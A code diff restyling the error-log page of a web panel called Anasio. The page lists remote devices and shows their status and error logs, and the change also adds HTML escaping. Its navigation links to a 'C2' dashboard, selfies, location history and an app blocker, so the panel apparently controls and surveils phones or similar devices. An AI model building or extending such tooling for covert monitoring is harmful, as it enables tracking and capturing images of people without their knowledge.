@@ -5,126 +5,207 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Anasio | Device Diagnostics</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
+    <style>
+        .spinning { animation: spin .8s linear infinite; display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .log-entry { animation: fadeIn .2s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
+    </style>
 </head>
 <body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
     <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
-        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200 gap-4">
-            <div class="flex items-center gap-4">
-                <div class="bg-red-600 text-white p-2 rounded-lg">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+
+        <!-- Nav -->
+        <nav class="mb-6 flex flex-wrap justify-between items-center bg-white px-5 py-4 rounded-2xl border border-gray-200 gap-4">
+            <div class="flex items-center gap-3">
+                <div class="bg-red-50 text-red-500 p-2.5 rounded-xl">
+                    <i class="ti ti-alert-circle text-xl"></i>
                 </div>
-                <div><h1 class="text-xl font-bold tracking-tight text-gray-900 text-center md:text-left">Device Diagnostics & Errors</h1></div>
+                <div>
+                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest">System Health</p>
+                    <h1 class="text-xl font-semibold text-gray-900 leading-tight">Device Diagnostics</h1>
+                </div>
             </div>
-            <div class="flex flex-wrap justify-center items-center gap-4">
-                <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
-                <a href="/apps_view" class="text-xs font-bold text-purple-600 hover:text-purple-800 transition tracking-wide uppercase">App Blocker</a>
-                <a href="/selfies_view" class="text-xs font-bold text-emerald-600 hover:text-emerald-800 transition tracking-wide uppercase">📸 Selfies</a>
-                <a href="/history_view" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">Location History</a>
-                <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
-                    <option value="">Loading...</option>
+            <div class="flex flex-wrap items-center gap-1.5">
+                <a href="/" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
+                    <i class="ti ti-cpu text-sm"></i> C2
+                </a>
+                <a href="/apps_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
+                    <i class="ti ti-apps text-sm"></i> Apps
+                </a>
+                <a href="/selfies_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
+                    <i class="ti ti-camera text-sm"></i> Selfies
+                </a>
+                <a href="/history_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
+                    <i class="ti ti-history text-sm"></i> History
+                </a>
+                <div class="w-px h-5 bg-gray-200 mx-1"></div>
+                <select id="device-select" aria-label="Select device"
+                    class="bg-white text-gray-800 font-medium text-sm border border-gray-200 rounded-lg px-3 py-1.5 focus:outline-none focus:ring-2 focus:ring-red-400 cursor-pointer hover:border-red-300 transition appearance-none pr-7">
+                    <option value="">Loading…</option>
                 </select>
             </div>
         </nav>
 
-        <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
+        <!-- Main card -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-5">
+            <!-- Header -->
             <div class="flex items-center justify-between mb-4">
-                <p class="text-xs font-bold text-red-500 uppercase tracking-widest">Error Logs</p>
-                <button type="button" id="refresh-errors-btn" class="text-xs font-semibold px-3 py-1 rounded-full bg-red-100 text-red-700 hover:bg-red-200 transition">Refresh</button>
+                <div class="flex items-center gap-2">
+                    <p class="text-xs font-semibold text-red-500 uppercase tracking-widest flex items-center gap-1.5">
+                        <i class="ti ti-file-alert"></i> Error Logs
+                    </p>
+                    <span id="count-badge" class="hidden text-xs font-semibold bg-red-100 text-red-600 px-2 py-0.5 rounded-full">0</span>
+                </div>
+                <button id="refresh-btn" type="button"
+                    class="flex items-center gap-1.5 text-xs font-medium text-gray-600 border border-gray-200 px-3 py-1.5 rounded-lg hover:bg-gray-50 transition disabled:opacity-50">
+                    <i id="refresh-icon" class="ti ti-refresh text-sm"></i> Refresh
+                </button>
             </div>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
-                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Device Status</p>
-                    <p id="errors-device-status" class="text-lg font-bold text-gray-800">Checking...</p>
+
+            <!-- Stats -->
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 mb-4">
+                <div class="bg-gray-50 rounded-xl p-4 border border-gray-100">
+                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-2 flex items-center gap-1">
+                        <i class="ti ti-wifi text-xs"></i> Device Status
+                    </p>
+                    <div id="stat-status">
+                        <span class="inline-flex items-center gap-1.5 text-sm font-medium bg-gray-100 text-gray-500 px-3 py-1 rounded-full">
+                            <span class="w-1.5 h-1.5 rounded-full bg-current"></span>Checking
+                        </span>
+                    </div>
                 </div>
-                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Error Count</p>
-                    <p id="errors-count" class="text-lg font-bold text-gray-800">0</p>
+                <div class="bg-gray-50 rounded-xl p-4 border border-gray-100">
+                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-2 flex items-center gap-1">
+                        <i class="ti ti-bug text-xs"></i> Error Count
+                    </p>
+                    <p id="stat-count" class="text-2xl font-semibold text-gray-800">—</p>
                 </div>
-                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Newest Entry</p>
-                    <p id="errors-last-entry" class="text-sm text-gray-700">None</p>
+                <div class="bg-gray-50 rounded-xl p-4 border border-gray-100">
+                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-2 flex items-center gap-1">
+                        <i class="ti ti-clock text-xs"></i> Most Recent
+                    </p>
+                    <p id="stat-last" class="text-sm text-gray-600">None</p>
                 </div>
             </div>
-            <div id="errors-container" class="flex flex-col gap-3 h-[600px] overflow-y-auto bg-gray-50 p-4 rounded-xl border border-gray-200 text-sm font-mono">
-                <span class="text-gray-400">Waiting for error logs...</span>
+
+            <!-- Log list -->
+            <div id="log-container" class="flex flex-col gap-2 h-[560px] overflow-y-auto bg-gray-50 p-4 rounded-xl border border-gray-100 text-sm font-mono">
+                <div class="flex flex-col items-center justify-center h-full gap-2 text-gray-400 font-sans">
+                    <i class="ti ti-loader-2 text-3xl spinning"></i>
+                    <p class="text-sm">Loading error logs…</p>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
         const selectEl = document.getElementById('device-select');
-        const errorsDeviceStatus = document.getElementById('errors-device-status');
-        const errorsCount = document.getElementById('errors-count');
-        const errorsLastEntry = document.getElementById('errors-last-entry');
+        const statStatus = document.getElementById('stat-status');
+        const statCount = document.getElementById('stat-count');
+        const statLast = document.getElementById('stat-last');
+        const logContainer = document.getElementById('log-container');
+        const countBadge = document.getElementById('count-badge');
+        const refreshBtn = document.getElementById('refresh-btn');
+        const refreshIcon = document.getElementById('refresh-icon');
 
-        async function fetchAvailableDevices() {
+        function escapeHtml(str) {
+            return String(str ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+        }
+
+        function setStatus(state) {
+            const map = {
+                online: `<span class="inline-flex items-center gap-1.5 text-sm font-medium bg-green-100 text-green-700 px-3 py-1 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Online</span>`,
+                offline: `<span class="inline-flex items-center gap-1.5 text-sm font-medium bg-red-100 text-red-600 px-3 py-1 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Offline</span>`,
+                checking: `<span class="inline-flex items-center gap-1.5 text-sm font-medium bg-gray-100 text-gray-500 px-3 py-1 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Checking</span>`,
+            };
+            statStatus.innerHTML = map[state] || map.checking;
+        }
+
+        function setRefreshing(loading) {
+            refreshIcon.className = loading ? 'ti ti-refresh text-sm spinning' : 'ti ti-refresh text-sm';
+            refreshBtn.disabled = loading;
+        }
+
+        function showEmpty(msg, icon = 'ti-circle-check') {
+            logContainer.innerHTML = `<div class="flex flex-col items-center justify-center h-full gap-2 text-gray-400 font-sans">
+                <i class="ti ${icon} text-3xl"></i><p class="text-sm">${msg}</p></div>`;
+        }
+
+        async function fetchDevices() {
             try {
                 const res = await fetch('/devices');
                 if (!res.ok) return;
                 const data = await res.json();
                 const devices = data.devices || [];
-                const selected = selectEl.value;
+                const prev = selectEl.value;
                 selectEl.innerHTML = '';
-                if (devices.length === 0) {
-                    selectEl.innerHTML = '<option value="">No devices</option>';
-                    return;
-                }
-                devices.forEach(did => {
+                if (!devices.length) { selectEl.innerHTML = '<option value="">No devices</option>'; return; }
+                devices.forEach(d => {
                     const opt = document.createElement('option');
-                    opt.value = did; opt.textContent = did;
-                    selectEl.appendChild(opt);
+                    opt.value = d; opt.textContent = d; selectEl.appendChild(opt);
                 });
-                selectEl.value = devices.includes(selected) ? selected : devices[0];
-            } catch(err) { console.error(err); }
-        }
-
-        async function fetchDeviceStatus() {
-            if(!selectEl.value) return;
-            try {
-                const res = await fetch(`/stats?device_id=${encodeURIComponent(selectEl.value)}`);
-                if(!res.ok) throw new Error('Status fetch failed');
-                const data = await res.json();
-                errorsDeviceStatus.textContent = data.is_online ? 'Online' : 'Offline';
-            } catch(e) {
-                errorsDeviceStatus.textContent = 'Offline';
-            }
-        }
-
-        async function fetchErrors() {
-            if(!selectEl.value) return;
-            const container = document.getElementById('errors-container');
-            try {
-                await fetchDeviceStatus();
-                const res = await fetch(`/get_errors?device_id=${encodeURIComponent(selectEl.value)}`);
-                if(res.ok) {
-                    const data = await res.json();
-                    container.innerHTML = '';
-                    if(!data.errors || data.errors.length === 0) {
-                        container.innerHTML = '<span class="text-gray-400">No errors reported for this device.</span>';
-                        errorsCount.textContent = '0';
-                        errorsLastEntry.textContent = 'None';
-                        return;
-                    }
-                    errorsCount.textContent = data.errors.length;
-                    errorsLastEntry.textContent = data.errors[0]?.timestamp || 'Unknown';
-                    data.errors.forEach(err => {
-                        const errEl = document.createElement('div');
-                        errEl.className = 'border-l-4 border-red-500 pl-4 py-2 mb-2 bg-white rounded shadow-sm border border-gray-200';
-                        errEl.innerHTML = `<div class="text-xs text-gray-500 mb-1">${err.timestamp} | <span class="font-bold text-red-600 uppercase tracking-wide">${err.source}</span></div>
-                                           <div class="text-gray-800 break-all whitespace-pre-wrap">${err.message}</div>`;
-                        container.appendChild(errEl);
-                    });
-                }
+                selectEl.value = devices.includes(prev) ? prev : devices[0];
             } catch(e) { console.error(e); }
         }
 
-        document.getElementById('refresh-errors-btn').addEventListener('click', fetchErrors);
+        async function fetchDeviceStatus() {
+            if (!selectEl.value) return;
+            try {
+                const res = await fetch(`/stats?device_id=${encodeURIComponent(selectEl.value)}`);
+                if (!res.ok) throw new Error();
+                const data = await res.json();
+                setStatus(data.is_online ? 'online' : 'offline');
+            } catch(e) { setStatus('offline'); }
+        }
+
+        async function fetchErrors() {
+            if (!selectEl.value) return;
+            setRefreshing(true);
+            setStatus('checking');
+            try {
+                await fetchDeviceStatus();
+                const res = await fetch(`/get_errors?device_id=${encodeURIComponent(selectEl.value)}`);
+                if (!res.ok) throw new Error();
+                const data = await res.json();
+                logContainer.innerHTML = '';
+                if (!data.errors || !data.errors.length) {
+                    statCount.textContent = '0';
+                    statLast.textContent = 'None';
+                    countBadge.classList.add('hidden');
+                    showEmpty('No errors reported for this device');
+                    return;
+                }
+                statCount.textContent = data.errors.length;
+                countBadge.textContent = data.errors.length;
+                countBadge.classList.remove('hidden');
+                statLast.textContent = data.errors[0]?.timestamp || 'Unknown';
+                data.errors.forEach(err => {
+                    const el = document.createElement('div');
+                    el.className = 'log-entry border-l-2 border-red-400 pl-3 py-2 bg-white rounded-lg border border-gray-100 shadow-sm mb-1';
+                    el.innerHTML = `
+                        <div class="flex items-center gap-2 mb-1 flex-wrap">
+                            <span class="text-[11px] text-gray-400 font-mono">${escapeHtml(err.timestamp)}</span>
+                            <span class="text-[10px] font-semibold uppercase tracking-wider bg-red-50 text-red-600 px-2 py-0.5 rounded">${escapeHtml(err.source)}</span>
+                        </div>
+                        <div class="text-[13px] text-gray-800 break-all whitespace-pre-wrap leading-relaxed">${escapeHtml(err.message)}</div>`;
+                    logContainer.appendChild(el);
+                });
+            } catch(e) {
+                showEmpty('Could not load error logs', 'ti-wifi-off');
+            } finally {
+                setRefreshing(false);
+            }
+        }
+
+        refreshBtn.addEventListener('click', fetchErrors);
         selectEl.addEventListener('change', fetchErrors);
-        
-        (async () => { 
-            await fetchAvailableDevices(); 
-            fetchErrors(); 
-            setInterval(() => { if (document.visibilityState === 'visible') fetchErrors(); }, 15000); 
+
+        (async () => {
+            await fetchDevices();
+            await fetchErrors();
+            setInterval(() => { if (document.visibilityState === 'visible') fetchErrors(); }, 15000);
         })();
     </script>
 </body>
